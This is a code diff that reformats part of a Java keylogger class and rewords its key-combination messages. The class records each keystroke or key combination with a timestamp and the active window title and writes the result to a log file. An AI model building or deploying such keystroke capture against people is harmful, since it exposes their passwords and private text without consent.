@@ -94,26 +94,29 @@ public class Keylogger implements NativeKeyListener
         }
     }
 
-    private void logKeyPressedEvent(String keyText) {
+    private void logKeyPressedEvent(String keyText)
+    {
         String dateTime = getCurrentDateTime(LOG_TIME_FORMAT);
         String activeWindowTitle = getActiveWindowTitle();
         StringBuilder logText = new StringBuilder(dateTime);
-    
-        // If there's a key combination, display it, otherwise just show the single key pressed
-        if (currentlyPressedKeys.size() > 1) {
+
+        // If there's a key combination, display it, otherwise just show the single key
+        // pressed
+        if (currentlyPressedKeys.size() > 1)
+        {
             logText.append(" [Keys: ").append(String.join(" + ", currentlyPressedKeys)).append("]");
-        } else {
+        } else
+        {
             logText.append(" [Key: ").append(keyText).append("]");
         }
-    
+
         // Add active window title
         logText.append(" [Window: ").append(activeWindowTitle).append("]");
-    
+
         String formattedLog = logText.toString();
         System.out.println(formattedLog);
         writeToFile(formattedLog + "\n");
     }
-    
 
     private String getActiveWindowTitle()
     {
@@ -142,14 +145,16 @@ public class Keylogger implements NativeKeyListener
         return now.format(formatter);
     }
 
+    // We probably don't need this code anymore
     private void checkForKeyCombinations()
     {
         if (currentlyPressedKeys.contains("Alt") && currentlyPressedKeys.contains("Tab"))
         {
-            System.out.println("Combination of Alt + Tab keys have been used. User might have switched windows.");
+            System.out.println("[Key Combination Detected] Alt + Tab: User may have switched windows.");
         } else if (currentlyPressedKeys.contains("Meta") && currentlyPressedKeys.contains("Tab"))
         {
-            System.out.println("Combination of Win + Tab keys have been used. User might have switched windows.");
+            System.out.println("[Key Combination Detected] Win + Tab: User may have accessed the task view.");
         }
     }
+
 }
